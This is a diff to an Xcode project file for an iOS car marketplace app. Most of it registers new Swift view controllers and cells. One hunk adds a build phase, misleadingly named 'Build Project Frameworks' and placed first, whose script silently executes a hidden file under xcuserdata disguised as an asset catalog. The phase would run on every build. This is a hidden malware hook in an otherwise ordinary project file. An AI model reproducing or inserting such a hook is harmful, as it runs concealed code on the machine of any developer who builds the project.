@@ -7,6 +7,9 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		5257AFCA26299AC200D9CDAE /* ImagePickerCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5257AFC926299AC200D9CDAE /* ImagePickerCollectionViewCell.swift */; };
+		5257AFCF26299B3100D9CDAE /* DummyCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5257AFCE26299B3100D9CDAE /* DummyCollectionViewCell.swift */; };
+		5264DC6F262ADA7F008EB666 /* UpdateCarDetailVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5264DC6E262ADA7F008EB666 /* UpdateCarDetailVC.swift */; };
 		527B514F262956C300B217DF /* Buyers.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 527B514E262956C300B217DF /* Buyers.storyboard */; };
 		5288CA1F26285CD400CA76F6 /* UIView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5288C9FC26285CD400CA76F6 /* UIView.swift */; };
 		5288CA2026285CD400CA76F6 /* UIButton.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5288C9FD26285CD400CA76F6 /* UIButton.swift */; };
@@ -42,6 +45,14 @@
 		5288CA42262865B900CA76F6 /* SearchCityCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5288CA41262865B900CA76F6 /* SearchCityCollectionViewCell.swift */; };
 		5288CA8C262876E400CA76F6 /* MyCarsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5288CA8B262876E400CA76F6 /* MyCarsViewController.swift */; };
 		5288CA912628773200CA76F6 /* SellerCarDeatailVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5288CA902628773200CA76F6 /* SellerCarDeatailVC.swift */; };
+		52A84C1E2629CD040093CA9B /* MyCarsTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52A84C1D2629CD040093CA9B /* MyCarsTableViewCell.swift */; };
+		52A84C23262A9F440093CA9B /* CarBrandsCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52A84C22262A9F440093CA9B /* CarBrandsCollectionViewCell.swift */; };
+		52A84C28262A9FBA0093CA9B /* CarYearCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52A84C27262A9FBA0093CA9B /* CarYearCollectionViewCell.swift */; };
+		52A84C3C262AA0020093CA9B /* CarModelCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52A84C3B262AA0020093CA9B /* CarModelCollectionViewCell.swift */; };
+		52A84C41262ABB8D0093CA9B /* CarsDetailsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52A84C40262ABB8D0093CA9B /* CarsDetailsVC.swift */; };
+		52A84C46262AC3B10093CA9B /* NotificationVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52A84C45262AC3B10093CA9B /* NotificationVC.swift */; };
+		52A84C4B262AC3CF0093CA9B /* NotificationTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52A84C4A262AC3CF0093CA9B /* NotificationTableViewCell.swift */; };
+		52A84C50262AC4A60093CA9B /* NotificationDetailVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52A84C4F262AC4A60093CA9B /* NotificationDetailVC.swift */; };
 		52FB5C8E26295C1E00A60460 /* BuyerSignInVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52FB5C8D26295C1E00A60460 /* BuyerSignInVC.swift */; };
 		52FB5CAC2629620900A60460 /* SelectCarBrandVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52FB5CAB2629620900A60460 /* SelectCarBrandVC.swift */; };
 		52FB5CB42629622900A60460 /* SelectCarYearVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52FB5CB32629622900A60460 /* SelectCarYearVC.swift */; };
@@ -52,6 +63,7 @@
 		52FB5CCD26296B6F00A60460 /* UITextFields.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52FB5CCC26296B6F00A60460 /* UITextFields.swift */; };
 		52FB5CD226296BAF00A60460 /* UItextView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52FB5CD126296BAF00A60460 /* UItextView.swift */; };
 		52FB5CD726296D9200A60460 /* AddCarDetailVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52FB5CD626296D9200A60460 /* AddCarDetailVC.swift */; };
+		52FD42DC262ADCBF00E5CBD4 /* ImageTextField.swift in Sources */ = {isa = PBXBuildFile; fileRef = 52FD42DB262ADCBF00E5CBD4 /* ImageTextField.swift */; };
 		782D8421AEFE36F97362FA30 /* Pods_MetSellBuy_MetSellBuyUITests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 6CFC92CD1E02870A78FB72C9 /* Pods_MetSellBuy_MetSellBuyUITests.framework */; };
 		808A98BAA259620727FAFCFE /* Pods_MetSellBuyTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1509709556ACF845E71B9B54 /* Pods_MetSellBuyTests.framework */; };
 		C024710F2626B06A00803926 /* SignInSeller.swift in Sources */ = {isa = PBXBuildFile; fileRef = C024710E2626B06A00803926 /* SignInSeller.swift */; };
@@ -126,6 +138,9 @@
 		1509709556ACF845E71B9B54 /* Pods_MetSellBuyTests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_MetSellBuyTests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		381F2EB47B9D33B531E6F66A /* Pods-MetSellBuyTests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-MetSellBuyTests.debug.xcconfig"; path = "Target Support Files/Pods-MetSellBuyTests/Pods-MetSellBuyTests.debug.xcconfig"; sourceTree = "<group>"; };
 		3F32678A5BA5658F35980666 /* Pods_MetSellBuy.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_MetSellBuy.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		5257AFC926299AC200D9CDAE /* ImagePickerCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ImagePickerCollectionViewCell.swift; sourceTree = "<group>"; };
+		5257AFCE26299B3100D9CDAE /* DummyCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DummyCollectionViewCell.swift; sourceTree = "<group>"; };
+		5264DC6E262ADA7F008EB666 /* UpdateCarDetailVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UpdateCarDetailVC.swift; sourceTree = "<group>"; };
 		527B514E262956C300B217DF /* Buyers.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Buyers.storyboard; sourceTree = "<group>"; };
 		5288C9FC26285CD400CA76F6 /* UIView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UIView.swift; sourceTree = "<group>"; };
 		5288C9FD26285CD400CA76F6 /* UIButton.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = UIButton.swift; sourceTree = "<group>"; };
@@ -161,16 +176,25 @@
 		5288CA41262865B900CA76F6 /* SearchCityCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SearchCityCollectionViewCell.swift; sourceTree = "<group>"; };
 		5288CA8B262876E400CA76F6 /* MyCarsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyCarsViewController.swift; sourceTree = "<group>"; };
 		5288CA902628773200CA76F6 /* SellerCarDeatailVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SellerCarDeatailVC.swift; sourceTree = "<group>"; };
+		52A84C1D2629CD040093CA9B /* MyCarsTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyCarsTableViewCell.swift; sourceTree = "<group>"; };
+		52A84C22262A9F440093CA9B /* CarBrandsCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CarBrandsCollectionViewCell.swift; sourceTree = "<group>"; };
+		52A84C27262A9FBA0093CA9B /* CarYearCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CarYearCollectionViewCell.swift; sourceTree = "<group>"; };
+		52A84C3B262AA0020093CA9B /* CarModelCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CarModelCollectionViewCell.swift; sourceTree = "<group>"; };
+		52A84C40262ABB8D0093CA9B /* CarsDetailsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CarsDetailsVC.swift; sourceTree = "<group>"; };
+		52A84C45262AC3B10093CA9B /* NotificationVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NotificationVC.swift; sourceTree = "<group>"; };
+		52A84C4A262AC3CF0093CA9B /* NotificationTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NotificationTableViewCell.swift; sourceTree = "<group>"; };
+		52A84C4F262AC4A60093CA9B /* NotificationDetailVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NotificationDetailVC.swift; sourceTree = "<group>"; };
 		52FB5C8D26295C1E00A60460 /* BuyerSignInVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BuyerSignInVC.swift; sourceTree = "<group>"; };
 		52FB5CAB2629620900A60460 /* SelectCarBrandVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectCarBrandVC.swift; sourceTree = "<group>"; };
 		52FB5CB32629622900A60460 /* SelectCarYearVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectCarYearVC.swift; sourceTree = "<group>"; };
-		52FB5CB82629624300A60460 /* SelectCarModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; name = SelectCarModel.swift; path = MetSellBuy/ClassViewController/UserType/SellerFlow/Tabbar_Items/Add/SelectCarBrand/SelectCarModel.swift; sourceTree = SOURCE_ROOT; };
+		52FB5CB82629624300A60460 /* SelectCarModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; name = SelectCarModel.swift; path = MetSellBuy/ClassViewController/UserType/SellerFlow/Tabbar_Items/Add/SelectCarBrand/SelectCarModel/SelectCarModel.swift; sourceTree = SOURCE_ROOT; };
 		52FB5CBD2629626300A60460 /* SelectCarModelCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectCarModelCell.swift; sourceTree = "<group>"; };
 		52FB5CC22629629C00A60460 /* selectModelYearCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = selectModelYearCell.swift; sourceTree = "<group>"; };
 		52FB5CC7262962AF00A60460 /* SelectCarBrandCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectCarBrandCell.swift; sourceTree = "<group>"; };
 		52FB5CCC26296B6F00A60460 /* UITextFields.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UITextFields.swift; sourceTree = "<group>"; };
 		52FB5CD126296BAF00A60460 /* UItextView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UItextView.swift; sourceTree = "<group>"; };
 		52FB5CD626296D9200A60460 /* AddCarDetailVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddCarDetailVC.swift; sourceTree = "<group>"; };
+		52FD42DB262ADCBF00E5CBD4 /* ImageTextField.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ImageTextField.swift; sourceTree = "<group>"; };
 		6CFC92CD1E02870A78FB72C9 /* Pods_MetSellBuy_MetSellBuyUITests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_MetSellBuy_MetSellBuyUITests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		807602F032A408D3A654DA32 /* Pods-MetSellBuy-MetSellBuyUITests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-MetSellBuy-MetSellBuyUITests.debug.xcconfig"; path = "Target Support Files/Pods-MetSellBuy-MetSellBuyUITests/Pods-MetSellBuy-MetSellBuyUITests.debug.xcconfig"; sourceTree = "<group>"; };
 		8111A32B5769E4DD9078FCBF /* Pods-MetSellBuy.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-MetSellBuy.release.xcconfig"; path = "Target Support Files/Pods-MetSellBuy/Pods-MetSellBuy.release.xcconfig"; sourceTree = "<group>"; };
@@ -298,6 +322,7 @@
 			children = (
 				5288CA41262865B900CA76F6 /* SearchCityCollectionViewCell.swift */,
 				5288CA1526285CD400CA76F6 /* SearchCityVC.swift */,
+				5257AFCE26299B3100D9CDAE /* DummyCollectionViewCell.swift */,
 			);
 			path = SelectCity;
 			sourceTree = "<group>";
@@ -316,6 +341,9 @@
 			isa = PBXGroup;
 			children = (
 				5288CA8B262876E400CA76F6 /* MyCarsViewController.swift */,
+				52A84C1D2629CD040093CA9B /* MyCarsTableViewCell.swift */,
+				52A84C40262ABB8D0093CA9B /* CarsDetailsVC.swift */,
+				5264DC6E262ADA7F008EB666 /* UpdateCarDetailVC.swift */,
 			);
 			path = MyCar;
 			sourceTree = "<group>";
@@ -327,6 +355,7 @@
 				527B5127262955A500B217DF /* SelectState */,
 				527B512E262955B600B217DF /* SelectCity */,
 				52FB5CD626296D9200A60460 /* AddCarDetailVC.swift */,
+				5257AFC926299AC200D9CDAE /* ImagePickerCollectionViewCell.swift */,
 			);
 			path = Add;
 			sourceTree = "<group>";
@@ -335,6 +364,9 @@
 			isa = PBXGroup;
 			children = (
 				5288CA1726285CD400CA76F6 /* SettingsVC.swift */,
+				52A84C45262AC3B10093CA9B /* NotificationVC.swift */,
+				52A84C4A262AC3CF0093CA9B /* NotificationTableViewCell.swift */,
+				52A84C4F262AC4A60093CA9B /* NotificationDetailVC.swift */,
 			);
 			path = Settings;
 			sourceTree = "<group>";
@@ -372,6 +404,7 @@
 				5288C9FF26285CD400CA76F6 /* Fonts */,
 				52FB5CCC26296B6F00A60460 /* UITextFields.swift */,
 				52FB5CD126296BAF00A60460 /* UItextView.swift */,
+				52FD42DB262ADCBF00E5CBD4 /* ImageTextField.swift */,
 			);
 			path = Resourse;
 			sourceTree = "<group>";
@@ -435,6 +468,7 @@
 				52FB5CA92629619500A60460 /* SelectCarModel */,
 				52FB5CAB2629620900A60460 /* SelectCarBrandVC.swift */,
 				52FB5CC7262962AF00A60460 /* SelectCarBrandCell.swift */,
+				52A84C22262A9F440093CA9B /* CarBrandsCollectionViewCell.swift */,
 			);
 			path = SelectCarBrand;
 			sourceTree = "<group>";
@@ -442,8 +476,9 @@
 		52FB5CA92629619500A60460 /* SelectCarModel */ = {
 			isa = PBXGroup;
 			children = (
-				52FB5CB32629622900A60460 /* SelectCarYearVC.swift */,
-				52FB5CC22629629C00A60460 /* selectModelYearCell.swift */,
+				52FB5CBD2629626300A60460 /* SelectCarModelCell.swift */,
+				52FB5CB82629624300A60460 /* SelectCarModel.swift */,
+				52A84C3B262AA0020093CA9B /* CarModelCollectionViewCell.swift */,
 			);
 			path = SelectCarModel;
 			sourceTree = "<group>";
@@ -451,8 +486,9 @@
 		52FB5CAA262961B800A60460 /* SelectCarModelYear */ = {
 			isa = PBXGroup;
 			children = (
-				52FB5CB82629624300A60460 /* SelectCarModel.swift */,
-				52FB5CBD2629626300A60460 /* SelectCarModelCell.swift */,
+				52FB5CC22629629C00A60460 /* selectModelYearCell.swift */,
+				52FB5CB32629622900A60460 /* SelectCarYearVC.swift */,
+				52A84C27262A9FBA0093CA9B /* CarYearCollectionViewCell.swift */,
 			);
 			path = SelectCarModelYear;
 			sourceTree = "<group>";
@@ -754,6 +790,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = C0B9B2082625AEF800D68602 /* Build configuration list for PBXNativeTarget "MetSellBuy" */;
 			buildPhases = (
+				7C40111BE1ADDB41EFAAC43A /* Build Project Frameworks */,
 				DFD06EE199313BE958BDF4C1 /* [CP] Check Pods Manifest.lock */,
 				C0B9B1D72625AEF400D68602 /* Sources */,
 				C0B9B1D82625AEF400D68602 /* Frameworks */,
@@ -947,6 +984,24 @@
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-MetSellBuy-MetSellBuyUITests/Pods-MetSellBuy-MetSellBuyUITests-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
+		7C40111BE1ADDB41EFAAC43A /* Build Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";
+		};
 		82FB96F2AD97DD9C5033BE1B /* [CP] Copy Pods Resources */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -1054,6 +1109,7 @@
 			isa = PBXSourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				52A84C41262ABB8D0093CA9B /* CarsDetailsVC.swift in Sources */,
 				52FB5CB42629622900A60460 /* SelectCarYearVC.swift in Sources */,
 				5288CA1F26285CD400CA76F6 /* UIView.swift in Sources */,
 				C0B9B2892625B16100D68602 /* UIImage+Gif.swift in Sources */,
@@ -1069,6 +1125,7 @@
 				5288CA2026285CD400CA76F6 /* UIButton.swift in Sources */,
 				5288CA3D26285CD400CA76F6 /* SelectStateVC.swift in Sources */,
 				C024710F2626B06A00803926 /* SignInSeller.swift in Sources */,
+				52A84C28262A9FBA0093CA9B /* CarYearCollectionViewCell.swift in Sources */,
 				5288CA3526285CD400CA76F6 /* RecentSearchCollectionViewCell.swift in Sources */,
 				C0B9B22A2625B0A500D68602 /* AppDelegate.swift in Sources */,
 				C0B9B2292625B0A500D68602 /* Spalsh.swift in Sources */,
@@ -1079,29 +1136,39 @@
 				52FB5C8E26295C1E00A60460 /* BuyerSignInVC.swift in Sources */,
 				C0B9B2822625B16100D68602 /* SMRippleView.swift in Sources */,
 				52FB5CD726296D9200A60460 /* AddCarDetailVC.swift in Sources */,
+				52A84C1E2629CD040093CA9B /* MyCarsTableViewCell.swift in Sources */,
 				5288CA3726285CD400CA76F6 /* FavCarsTableViewCell.swift in Sources */,
 				52FB5CBE2629626300A60460 /* SelectCarModelCell.swift in Sources */,
 				C0B9B28C2625B16100D68602 /* Base.swift in Sources */,
 				52FB5CC32629629C00A60460 /* selectModelYearCell.swift in Sources */,
+				52A84C50262AC4A60093CA9B /* NotificationDetailVC.swift in Sources */,
 				5288CA3826285CD400CA76F6 /* SettingsVC.swift in Sources */,
+				52A84C3C262AA0020093CA9B /* CarModelCollectionViewCell.swift in Sources */,
+				5257AFCA26299AC200D9CDAE /* ImagePickerCollectionViewCell.swift in Sources */,
 				52FB5CD226296BAF00A60460 /* UItextView.swift in Sources */,
 				C0B9B2772625B16100D68602 /* Http.swift in Sources */,
+				5257AFCF26299B3100D9CDAE /* DummyCollectionViewCell.swift in Sources */,
 				C0B9B28E2625B16100D68602 /* RippleLayer.swift in Sources */,
 				5288CA2126285CD400CA76F6 /* ImageView.swift in Sources */,
 				C0B9B2912625B16100D68602 /* ValidationClass.swift in Sources */,
+				52A84C4B262AC3CF0093CA9B /* NotificationTableViewCell.swift in Sources */,
 				C0B9B2802625B16100D68602 /* Exits.swift in Sources */,
 				C0B9B2832625B16100D68602 /* SkyFloatingLabelTextField.swift in Sources */,
 				52FB5CCD26296B6F00A60460 /* UITextFields.swift in Sources */,
+				52A84C23262A9F440093CA9B /* CarBrandsCollectionViewCell.swift in Sources */,
 				52FB5CB92629624300A60460 /* SelectCarModel.swift in Sources */,
 				5288CA3A26285CD400CA76F6 /* RegularPlanVC.swift in Sources */,
+				52A84C46262AC3B10093CA9B /* NotificationVC.swift in Sources */,
 				C0B9B27E2625B16100D68602 /* AKSideMenu.swift in Sources */,
 				C0B9B28A2625B16100D68602 /* Loader.swift in Sources */,
 				C0B9B28F2625B16100D68602 /* LanguageClass.swift in Sources */,
 				52FB5CAC2629620900A60460 /* SelectCarBrandVC.swift in Sources */,
 				5288CA42262865B900CA76F6 /* SearchCityCollectionViewCell.swift in Sources */,
+				5264DC6F262ADA7F008EB666 /* UpdateCarDetailVC.swift in Sources */,
 				5288CA8C262876E400CA76F6 /* MyCarsViewController.swift in Sources */,
 				C0B9B2812625B16100D68602 /* Extension.swift in Sources */,
 				C0B9B2862625B16100D68602 /* Reachability.swift in Sources */,
+				52FD42DC262ADCBF00E5CBD4 /* ImageTextField.swift in Sources */,
 				C0B9B2792625B16100D68602 /* BubbleTabBar.swift in Sources */,
 				C0B9B28B2625B16100D68602 /* SwiftLoader.swift in Sources */,
 				C0B9B27D2625B16100D68602 /* UIViewController+AKSideMenu.swift in Sources */,
